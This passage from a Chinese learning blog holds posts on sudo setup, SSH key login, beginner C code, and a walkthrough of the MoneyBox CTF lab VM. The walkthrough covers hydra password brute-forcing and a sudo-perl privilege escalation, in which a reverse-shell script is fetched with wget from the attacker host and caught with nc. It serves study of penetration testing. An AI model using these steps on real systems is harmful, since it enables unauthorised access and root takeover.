<h2 id="3）基本配置"><a href="#3）基本配置" class="headerlink" title="3）基本配置"></a>3）基本配置</h2><p>系统默认创建了一个名为 sudo 的组。只要把用户加入这个组，用户就具有了 sudo 的权限。<br>至于如何把用户加入 sudo 组，您可以直接编辑 /etc/group 文件，当然您得使用一个有 sudo 权限的用户来干这件事：<br>先创建用户并设置密码后，然后在sudo组中加入该用户，多个用户用逗号隔开。<br><img data-src="/2023/11/11/liunx%E4%B8%ADsudo%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/1.png" alt="1.png"><br>添加内容如下：<br><img data-src="/2023/11/11/liunx%E4%B8%ADsudo%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/2.png" alt="2.png"><br>我们把用户 testuser 添加到了 sudo 组中，所以当用户 testuser 登录后就可以通过 sudo 命令以 root 权限执行命令了！<br>但是，用testuser执行root权限的命令时会报错：<br>解决办法：<br>1)、切换到root用户下<br>普通用户切换到root用户下：sudo -i<br>root用户切换到普通用户下：su testuser</p>
<p>2)、添加sudo文件的写权限,命令是:<br>chmod u+w /etc/sudoers</p>
<p>3)、编辑sudoers文件<br>vi /etc/sudoers<br>找到这行 root ALL=(ALL) ALL,在他下面添加xxx ALL=(ALL) ALL (这里的xxx是你的用户名)<br><img data-src="/2023/11/11/liunx%E4%B8%ADsudo%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/3.png" alt="3.png"><br>ps:这里说下你可以sudoers添加下面四行中任意一条<br>youuser ALL=(ALL) ALL<br>%youuser ALL=(ALL) ALL<br>youuser ALL=(ALL) NOPASSWD: ALL<br>%youuser ALL=(ALL) NOPASSWD: ALL</p>
<p>第一行:允许用户youuser执行sudo命令(需要输入密码).<br>第二行:允许用户组youuser里面的用户执行sudo命令(需要输入密码).<br>第三行:允许用户youuser执行sudo命令,并且在执行的时候不输入密码.<br>第四行:允许用户组youuser里面的用户执行sudo命令,并且在执行的时候不输入密码.</p>
<p>4)、撤销sudoers文件写权限,命令:<br>chmod u-w /etc/sudoers</p>
<p>这样普通用户就可以使用sudo了。</p>
<p>4、sudo命令的日志</p>
<p>在 ubuntu 中，sudo 的日志默认被记录在 /var/log/auth.log 文件中。当我们执行 sudo 命令时，相关日志都是会被记录下来的。比如下图中显示的就是一次执行 sudo 命令的日志。<br>在sudo于1980年前后被写出之前，一般用户管理系统的方式是利用su切换为超级用户。但是使用su的缺点之一在于必须要先告知超级用户的密码。</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>liunx中ssh服务相关知识</title>
    <url>/2023/11/08/linux%E4%B8%ADssh%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="最近课程讲到了ssh服务-故此做个记录"><a href="#最近课程讲到了ssh服务-故此做个记录" class="headerlink" title="最近课程讲到了ssh服务 故此做个记录"></a>最近课程讲到了ssh服务 故此做个记录</h1><h2 id="1）ssh是什么涅？"><a href="#1）ssh是什么涅？" class="headerlink" title="1）ssh是什么涅？"></a>1）ssh是什么涅？</h2><blockquote>
<p><a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/Secure_Shell">SSH</a>&nbsp;叫安全外壳协议（<strong>S</strong>ecure&nbsp;<strong>Sh</strong>ell），是一种加密的网络传输协议，可在不安全的网络中网络服务提供安全的传输环境。它通过在网络中创建安全隧道来实现 SSH 客户端和服务器之间的连接。</p>
</blockquote>
<h2 id="2）ssh的原理是什么涅？"><a href="#2）ssh的原理是什么涅？" class="headerlink" title="2）ssh的原理是什么涅？"></a>2）ssh的原理是什么涅？</h2><span id="more"></span>
<blockquote>
<p>SSH 之所以一经提出，就得到了快速发展，是因为数据的安全性对任何人都非常重要。这里我们对其保护数据安全的原理进行探究。</p>
</blockquote>
<p>在聊加密前先介绍一下几个密码学的基本概念：</p>
<ul>
<li>明文<code>plaintext</code>&nbsp;指传送方（一般指客户端）想要接受方（一般指服务端）获得的<strong>可读信息</strong></li>
<li>密文<code>ciphertext</code>&nbsp;指明文进过加密后所产生的信息</li>
<li>秘钥<code>key</code>&nbsp;指用来完成加密、解密、完整性验证等密码学应用的密码信息，是明文转换为密文或密文转换为明文的算法需要的参数</li>
<li>私钥 指私有的秘钥</li>
<li>公钥 指公开的秘钥</li>
</ul>
<p>常见的加密有两种：<strong>对称加密</strong>和<strong>非对称加密</strong><br>对称加密: 加密和解密的秘钥使用的是同一个.<br>非对称加密: 与对称加密算法不同，非对称加密算法需要两个密钥：公开密钥（publickey）和私有密钥（privatekey）。</p>
<p>对称加密算法: 密钥较短，破译困难，除了数据加密标准（DES），另一个对称密钥加密系统是国际数据加密算法（IDEA），它比DES的加密性好，且对计算机性能要求也没有那么高.<br>优点:<br>    算法公开、计算量小、加密速度快、加密效率高<br>缺点:<br>    在数据传送前，发送方和接收方必须商定好秘钥，然后 使双方都能保存好秘钥。其次如果一方的秘钥被泄露，那么加密信息也就不安全了。另外，每对用户每次使用对称加密算法时，都需要使用其他人不知道的唯一秘钥，这会使得收、发双方所拥有的钥匙数量巨大，密钥管理成为双方的负担。<br>常见的对称加密算法有: DES、3DES、Blowfish、IDEA、RC4、RC5、RC6 和 AES </p>
<p>非对称加密算法: 公开密钥与私有密钥是一对，如果用公开密钥对数据进行加密，只有用对应的私有密钥才能解密；如果用私有密钥对数据进行加密，那么只有用对应的公开密钥才能解密。因为加密和解密使用的是两个不同的密钥，所以这种算法叫作非对称加密算法。</p>
<p>非对称加密算法实现机密信息交换的基本过程是：甲方生成一对密钥并将其中的一把作为公用密钥向其它方公开；得到该公用密钥的乙方使用该密钥对机密信息进行加密后再发送给甲方；甲方再用自己保存的另一把专用密钥对加密后的信息进行解密。甲方只能用其专用密钥解密由其公用密钥加密后的任何信息。<br>优点:<br>    安全<br>缺点:<br>    速度较慢<br>常见的非对称加密算法有: RSA、ECC（移动设备用）、Diffie-Hellman、El Gamal、DSA（数字签名用）</p>
<h2 id="3）ssh登录与免密登录的方式"><a href="#3）ssh登录与免密登录的方式" class="headerlink" title="3）ssh登录与免密登录的方式"></a>3）ssh登录与免密登录的方式</h2><p>登录方式:<br><code>ssh 用户名@ip地址</code><br>免密登录方式：<br>生成公共身份验证密钥并将其附加到远程主机 ~/.ssh/authorized_keys 文件即可。<br><strong>具体步骤</strong>：</p>
<ol>
<li><p>检查现有的 SSH 密钥对。<br>在生成新的 SSH 密钥对之前，首先检查您的客户端计算机上是否已有 SSH 密钥，因为您不想覆盖现有密钥。<br>运行以下 ls 命令以查看是否存在现有 SSH 密钥：<br><code>ls -al ~/.ssh/id_*.pub</code><br>如果存在现有密钥，您可以使用这些密钥并跳过下一步或备份旧密钥并生成新密钥。<br>如果您看到 No such file or directory 或 no matches found 意味着您没有 SSH 密钥，则可以继续执行下一步并生成新密钥。</p>
</li>
<li><p>生成新的 SSH 密钥对。<br>以下命令将生成一个新的密钥对：<br><code>ssh-keygen</code><br>按 Enter 接受则默认文件位置和文件名：<br><code>Enter file in which to save the key (/home/yourusername/.ssh/id_rsa):</code><br>接下来，ssh-keygen 工具将要求您键入安全密码。无论您是否想要使用密码短语都取决于您，如果您选择使用密码短语，您将获得额外的安全保护。在大多数情况下，开发人员和系统管理员使用 SSH 而不使用密码，因为它们对完全自动化的流程很有用。如果您不想使用密码短语，请按 Enter<br><code>Enter passphrase (empty for no passphrase):</code></p>
</li>
<li><p>要确认是否已经生成 SSH 密钥，您可以使用以下命令列出新的私钥和公钥：</p>
<pre class="line-numbers language-none"><code class="language-none">ls ~/.ssh/id_*
/home/yourusername/.ssh/id_rsa /home/yourusername/.ssh/id_rsa.pub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li><p>复制公钥<br>现在您已经生成了 SSH 密钥对，为了能够在没有密码的情况下登录到您的服务器，您需要将公钥复制到您要管理的服务器。<br>将公钥复制到服务器的最简单方法是使用名为的命令 ssh-copy-id 。在您的本地机器终端类型：<br><code>ssh-copy-id remote_username@server_ip_address</code><br>系统将提示您输入 remote_username 的密码：<br><code>remote_username@server_ip_address's password:</code><br>用户通过身份验证后，公钥将附加到远程用户 authorized_keys 文件，并且将关闭连接。<br>如果由于某种原因， ssh-copy-id 本地计算机上没有该实用程序，则可以使用以下命令复制公钥：<br><code>cat ~/.ssh/id_rsa.pub | ssh remote_username@server_ip_address "mkdir -p ~/.ssh &amp;&amp; cat &gt;&gt; ~/.ssh/authorized_keys"</code></p>
</li>
<li><p>使用 SSH 密钥登录服务器<br>完成上述步骤后，您应该能够登录到远程服务器而不会被提示输入密码。<br>尝试通过 SSH 登录到您的服务器：<br><code>ssh remote_username@server_ip_address</code><br>如果一切顺利，您将立即登录。</p>
</li>
</ol>
<h2 id="4）参考资料"><a href="#4）参考资料" class="headerlink" title="4）参考资料"></a>4）参考资料</h2><p><a href="https://zhuanlan.zhihu.com/p/235610836">深入了解SSH</a>————知乎<br><a href="https://blog.csdn.net/weixin_57099902/article/details/132717146">如何设置SSH免密登录</a>————CSDN</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>moneybox解析</title>
    <url>/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p><em><strong>注1:由于我没有解决加载问题 因此没有魔法网络的用户很有可能无法顺利看到图片 烦请根据文字自己判断一下步骤结果 谢谢</strong></em><br><em><strong>注2:该教程使用的环境是我的个人pc 实战操作可能由于系统原因 vmware配置 虚拟机版本等出现细微的不同 希望各位随机应变勇闯难关</strong></em></p>
<h1 id="1-关于事先配置"><a href="#1-关于事先配置" class="headerlink" title="1.关于事先配置"></a>1.关于事先配置</h1><p>安装了<strong>vmware</strong>的pc一台<br>kali <a href="https://www.kali.org/get-kali/#kali-virtual-machines">下载页面</a><br>还有我们的主角 moneybox <a href="https://www.vulnhub.com/entry/moneybox-1,653/#download">下载页面</a><br>在<strong>vmware</strong>中打开虚拟机 选择kali和moneybox并安装</p>
<p>为了方便后续的步骤<strong>记得在虚拟机设置-网络适配器中将两个虚拟机都设置为NAT模式</strong><br>这样你就完成了基础的配置</p>
<h1 id="2-具体步骤"><a href="#2-具体步骤" class="headerlink" title="2.具体步骤"></a>2.具体步骤</h1><span id="more"></span>
<h2 id="（1）moneybox的启动"><a href="#（1）moneybox的启动" class="headerlink" title="（1）moneybox的启动"></a>（1）moneybox的启动</h2><p>在启动时立马按e编辑启动项</p>
<p><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step1.jpg" alt="step1.jpg"></p>
<p>↑在启动项中 linux 开头这行将 <strong>ro</strong> 改成 <strong>rw single init=bin/bash</strong><br>随后按 <strong>ctrl+x</strong> 保存<br>可以通过进入单用户模式的方式修改密码<br>输入<strong>passwd root</strong> 将密码更改成任意你所希望的样子<br>这之后重启 输入账号<strong>root</strong> 与 <strong>你更改的密码</strong><br>进入后输入 <strong>dhclient</strong> 配置网络接口<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step2.jpg" alt="step2.jpg"><br>↑示例<br>随后一直挂着moneybox就可以了 转到kali这边</p>
<h2 id="（2）kali部分的操作"><a href="#（2）kali部分的操作" class="headerlink" title="（2）kali部分的操作"></a>（2）kali部分的操作</h2><h3 id="（2-1）找到靶机所处的网段"><a href="#（2-1）找到靶机所处的网段" class="headerlink" title="（2.1）找到靶机所处的网段"></a>（2.1）找到靶机所处的网段</h3><p>kali打开 默认账号密码是kali/kali<br>先 <strong>sudo arp-scan -l</strong> 扫描一下同网段设备<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step3.jpg" alt="step3.jpg"><br>不太确定哪个是靶机 是吧<br>先用<strong>nmap -p- 192.168.246.0/24</strong>扫描一下这些ip开放的端口<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step4.jpg" alt="step4.jpg"><br>结果说<strong>192.168.246.129</strong>开放了仨端口 分别是<strong>21 22 80</strong><br>可以确定是靶机了<br>接下来就会围绕这个ip展开操作</p>
<h3 id="（2-2）三个端口所引导的线索"><a href="#（2-2）三个端口所引导的线索" class="headerlink" title="（2.2）三个端口所引导的线索"></a>（2.2）三个端口所引导的线索</h3><p>首先是 <strong>21端口</strong> 对应的 <strong>ftp功能</strong><br>使用ftp+ip的方式尝试远程登陆<br>发现需要密码 回车后显示<strong>530 This FTP server is anonymous only.</strong><br>既然仅限匿名登录 那就<strong>以anonymous为账号 密码为空</strong>来登陆<br>登录完毕 ls查看目录下文件<br>有一张名为trytofind.jpg的图片 用get+文件名的方式获取<br>随后用exit退出ftp<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step5.jpg" alt="step5.jpg"><br><strong>steghide+info+图片文件名</strong>寻找是否有图片隐写 发现需要密码 线索暂时断了<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step7.jpg" alt="step7.jpg"></p>
<p> <em><strong>ps:关于显示steghide未安装 随后无法安装显示E:Unable to locate package的解决方式</strong></em></p>
<blockquote>
<p>第一步：打开sources.list文件</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">sudo vim /etc/apt/sources.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>第二步：在文件中添加以下内容</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">deb http://http.kali.org/kali kali-rolling main contrib non-free
deb http://http.kali.org/kali sana main non-free contrib
deb http://security.kali.org/kali-security sana/updates main contrib non-free
deb http://old.kali.org/kali moto main non-free contrib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>然后保存退出，再进行更新</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">sudo apt-get update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>————————————————<br>版权声明：上面这段说明为CSDN博主「聂大哥」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_43729943/article/details/104221462">https://blog.csdn.net/weixin_43729943/article/details/104221462</a></p>
</blockquote>
<p><strong>22端口所对应的ssh功能</strong>通常需要账号密码 目前没有线索 我们先转到http上去寻找<br>打开firefox 我们输入ip地址<strong>192.168.246.129</strong><br>进入主页<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step8.jpg" alt="step8.jpg"><br>我们<strong>f12</strong>查看一下源码<br>发现啥也没藏<br>于是使用我们的工具<br><strong>dirb+网址</strong>来寻找是否有潜在的目录<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step9.jpg" alt="step9.jpg"><br>↑运行结果发现了名为<a href="http://192.168.246.129/blogs/index.html%E7%9A%84%E7%9B%AE%E5%BD%95">http://192.168.246.129/blogs/index.html的目录</a><br>进入网址<br>还是老样子<strong>f12</strong>查看源码 发现注释里藏了点东西<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step10.jpg" alt="step10.jpg"><br>它说是提示在这个目录里 那就进入<a href="http://192.168.246.129/S3cr3t-T3xt/">http://192.168.246.129/S3cr3t-T3xt/</a><br>还是在源码里藏了东西<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step11.jpg" alt="step11.jpg"><br>发现了一段Secret Key 保存下来备用<br>我们猜测这段密文和steghide中的密码相对应 尝试输入<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step12.jpg" alt="step12.jpg"><br>提取出了<strong>data.txt</strong><br>其中内容为暗示一个<strong>名为renu的用户</strong>的密码强度很弱<br>或许可以使用密码爆破来获得密码<br>于是我们可以利用<strong>kali自带的密码爆破字典</strong>与<strong>hydra</strong>来爆破<br>rockyou.txt被压缩，需要解压才能够使用</p>
<pre class="line-numbers language-none"><code class="language-none">gzip -d /usr/share/wordlists/rockyou.txt.gz		#-d 将压缩文件解压
ll /usr/share/wordlists/rockyou.txt		#显示当前目录下文件详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><em><strong>hydra使用方法:</strong></em></p>
<pre class="line-numbers language-none"><code class="language-none">hydra -l 用户名 -P 密码字典 协议://ip地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step13.jpg" alt="step13.jpg"><br>↑试出来的结果是密码为987654321</p>
<h3 id="2-3-ssh连接与操作"><a href="#2-3-ssh连接与操作" class="headerlink" title="(2.3)ssh连接与操作"></a>(2.3)ssh连接与操作</h3><p>使用<strong>ssh+账号@ip:端口</strong>来链接renu<br>输入密码 链接成功<br>输入ls来查看文件 有一个txt<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step14.jpg" alt="step14.jpg"><br>↑cat user1.txt获得第一个flag<br>第二个flag在于这个电脑所留下的操作历史<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step15.jpg" alt="step15.jpg"><br>里面有免密登陆一个叫lily的用户的过程<br>说明此用户已经将自己的公钥拷贝到了靶机系统上的lily用户家目录的authorized_keys文件，从而可以不用密码就以lily身份登录到靶机上。<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step16.jpg" alt="step16.jpg"><br>第二个flag也获得了<br>第三个flag多半是在root账号中<br>但sudo的权限也无法查看<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step17.jpg" alt="step17.jpg"><br>这里就要用到一些高级操作<br>我这里直接引用课上的讲义了</p>
<blockquote>
<p>执行sudo -l发现该用户存在sudo赋权，程序为/usr/bin/perl，perl同python类似，也是一门解释型语言，推测靶机应该有perl运行环境。下面是如何通过Perl程序提权的实现过程。<br>思路：kali中自带perl脚本反弹shell，将其略加修改拷贝到靶机上；该脚本需要在渗透机监听一个端口(默认为1234)，然后在靶机上运行perl脚本，靶机会自动反弹一个shell到渗透机，从而通过运行perl程序获得一个管理员的Shell。</p>
</blockquote>
<ol>
<li>定位kali中的perl脚本反弹shell，将其拷贝到kali的/var/www/html下，重命名为p.php；<pre class="line-numbers language-none"><code class="language-none">cd /usr/share/webshells/perl
sudo cp perl-reverse-shell.pl /var/www/html/p.php
cd /var/www/html
ls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step18.jpg" alt="step18.jpg"></li>
<li>修改p.php文件内容，将反弹连接的Ip地址改为kali的IP；<pre class="line-numbers language-none"><code class="language-none">sudo vim p.php //把my $ip这段单引号里面的ip改成kali的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step19.jpg" alt="step19.jpg"></li>
<li>开启kali的网站服务<pre class="line-numbers language-none"><code class="language-none">systemctl start apache2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step20.jpg" alt="step20.jpg"></li>
<li>切换到靶机lily会话，通过http协议下载p.php<pre class="line-numbers language-none"><code class="language-none">wget http://ip/p.php //不知道ip的可以在另个窗口ifconfig查看<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step21.jpg" alt="step21.jpg"></li>
<li>kali 通过nc命令监听1234端口<pre class="line-numbers language-none"><code class="language-none">nc -lnvp 1234<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step22.jpg" alt="step22.jpg"></li>
<li>靶机上通过sudo 运行p.php程序<pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/perl p.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step23.jpg" alt="step23.jpg"></li>
<li>切换到渗透机kali，成功反弹管理员权限shell<pre class="line-numbers language-none"><code class="language-none">id
cd /root
ls -a
cat .root.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step24.jpg" alt="step24.jpg"></li>
<li>拿到最终flag啦！<pre class="line-numbers language-none"><code class="language-none">Congratulations.......!

You Successfully completed MoneyBox

Finally The Root Flag
    ==&gt; r00t{H4ckth3p14n3t}

I'm Kirthik-KarvendhanT
    It's My First CTF Box
         
instagram : ____kirthik____

See You Back....<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h1><p>前两个flag较为简易 最后一个flag要花点力气<br>希望今后的学习能让我更透彻的理解渗透测试的奥妙<br>那么 下次再见！</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言相关1</title>
    <url>/2023/08/01/C%E8%AF%AD%E8%A8%80%E7%9B%B8%E5%85%B31/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>所以 最近很闲 所以开始学c语言</p>
<span id="more"></span>
<h1 id="准备步骤"><a href="#准备步骤" class="headerlink" title="准备步骤"></a>准备步骤</h1><p>我使用了visual studio code配置c语言环境的方法来实现程序的调试和运行<br><a href="https://www.bilibili.com/video/BV19c411G7ey">我所参考的教程</a></p>
<h1 id="学习笔记啥的"><a href="#学习笔记啥的" class="headerlink" title="学习笔记啥的"></a>学习笔记啥的</h1><h2 id="一-经典到不能再经典的hello-world"><a href="#一-经典到不能再经典的hello-world" class="headerlink" title="一.经典到不能再经典的hello world"></a>一.经典到不能再经典的hello world</h2><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
 
int main()
{
    /* 我的第一个 C 程序 */
    printf("Hello, World! \n");
 
    return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>实例解析：</strong></p>
<ul>
<li>所有的 C 语言程序都需要包含&nbsp;<strong>main()</strong>&nbsp;函数。 代码从&nbsp;<strong>main()</strong>&nbsp;函数开始执行。</li>
<li><strong>/* … */</strong>&nbsp;用于注释说明。</li>
<li><strong>printf()</strong>&nbsp;用于格式化输出到屏幕。<strong>printf()</strong>&nbsp;函数在&nbsp;<strong>“stdio.h”</strong>&nbsp;头文件中声明。</li>
<li><strong>stdio.h</strong>&nbsp;是一个头文件 (标准输入输出头文件) ,&nbsp;<strong>#include</strong>&nbsp;是一个预处理命令，用来引入头文件。 当编译器遇到&nbsp;<strong>printf()</strong>&nbsp;函数时，如果没有找到&nbsp;<strong>stdio.h</strong>&nbsp;头文件，会发生编译错误。</li>
<li><strong>return 0;</strong>&nbsp;语句用于表示退出程序。</li>
</ul>
<h2 id="二-关于定义变量和变量的类型"><a href="#二-关于定义变量和变量的类型" class="headerlink" title="二.关于定义变量和变量的类型"></a>二.关于定义变量和变量的类型</h2><h3 id="（1）单纯的计算"><a href="#（1）单纯的计算" class="headerlink" title="（1）单纯的计算"></a>（1）单纯的计算</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt; //这个是类似于import的东西 没有它printf会失效
int x;// 这里是我定义了x
int y;// 这里是我定义了y
int wow()// 定义一个叫wow（）的进程
{
&nbsp; &nbsp; extern int x;// 借用外部定义好的x
&nbsp; &nbsp; extern int y;// 借用外部定义好的y
&nbsp; &nbsp; x = 1222;
&nbsp; &nbsp; y = 1999;// 为x y赋值
&nbsp; &nbsp; return x*y;// 程序的结果是输出x乘以y的数字
}
int main()// 主程序 不能缺少
{
&nbsp; &nbsp; int jieguo;
&nbsp; &nbsp; jieguo = wow(); //用jieguo这个定义好的变量来表示wow（）的结果
&nbsp; &nbsp; printf("你得到的结果是：%d",jieguo);//将输出的东西表示出来
&nbsp; &nbsp; return 0;//结束程序
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果：</p>
<pre class="line-numbers language-none"><code class="language-none">你得到的结果是：2442778<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>题外话：<br>printf（）中的%d指输出整数，实际显示的时候会被逗号后的结果所代替。</p>
<h3 id="（2）利用scanf-加入互动环节"><a href="#（2）利用scanf-加入互动环节" class="headerlink" title="（2）利用scanf()加入互动环节"></a>（2）利用scanf()加入互动环节</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt; //这个是类似于import的东西 没有它printf会失效
int x=0;// 这里是我定义了x
int y=0;// 这里是我定义了y
int wow()// 定义一个叫wow（）的进程
{
&nbsp; &nbsp; extern int x;// 借用外部定义好的x
&nbsp; &nbsp; extern int y;// 借用外部定义好的y
&nbsp; &nbsp; printf("请输入x值\n");
&nbsp; &nbsp; scanf("%d",&amp;x);
&nbsp; &nbsp; printf("请输入y值\n");
&nbsp; &nbsp; scanf("%d",&amp;y);
&nbsp; &nbsp; return x*y;// 程序的结果是输出x乘以y的数字
}
int main()// 主程序 不能缺少
{
&nbsp; &nbsp; int jieguo;
&nbsp; &nbsp; jieguo = wow(); //用jieguo这个定义好的变量来表示wow（）的结果
&nbsp; &nbsp; printf("你得到的结果是：%d",jieguo);//将输出的东西表示出来
&nbsp; &nbsp; return 0;//结束程序
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出：</p>
<pre class="line-numbers language-none"><code class="language-none">请输入x值
9
请输入y值
11
你得到的结果是：99<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>题外话：<br>scanf()中输入的东西是他所需要获取的 如加入逗号或者空格后不按照格式输入<br>理论来说会无法读取<br>\n代表换行<br>scanf(“%d, %d, %d”,&amp;a,&amp;b,&amp;c);  ←复合用法</p>
<h2 id="三-循环与if-else"><a href="#三-循环与if-else" class="headerlink" title="三.循环与if else"></a>三.循环与if else</h2><h3 id="（1）while"><a href="#（1）while" class="headerlink" title="（1）while"></a>（1）while</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main()
{
&nbsp; &nbsp; int i=0;
&nbsp; &nbsp; while (i&lt;=100)
&nbsp; &nbsp; {
&nbsp; &nbsp; &nbsp; &nbsp; i++;
&nbsp; &nbsp; &nbsp; &nbsp; printf("第%d",i);
&nbsp; &nbsp; &nbsp; &nbsp; printf("次\n");
&nbsp; &nbsp; }
&nbsp; &nbsp; return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果：</p>
<pre class="line-numbers language-none"><code class="language-none">第1次
第2次
第3次
第4次
第5次
第6次
第7次
第8次
第9次
(中略)
第101次<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>说真的 c语言和python蛮像哈？<br>下表显示了 C 语言支持的所有算术运算符。假设变量&nbsp;<strong>A</strong>&nbsp;的值为 10，变量&nbsp;<strong>B</strong>&nbsp;的值为 20，则：</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>把两个操作数相加</td>
<td>A + B 将得到 30</td>
</tr>
<tr>
<td>-</td>
<td>从第一个操作数中减去第二个操作数</td>
<td>A - B 将得到 -10</td>
</tr>
<tr>
<td>*</td>
<td>把两个操作数相乘</td>
<td>A * B 将得到 200</td>
</tr>
<tr>
<td>/</td>
<td>分子除以分母</td>
<td>B / A 将得到 2</td>
</tr>
<tr>
<td>%</td>
<td>取模运算符，整除后的余数</td>
<td>B % A 将得到 0</td>
</tr>
<tr>
<td>++</td>
<td>自增运算符，整数值增加 1</td>
<td>A++ 将得到 11</td>
</tr>
<tr>
<td>–</td>
<td>自减运算符，整数值减少 1</td>
<td>A– 将得到 9</td>
</tr>
</tbody></table>
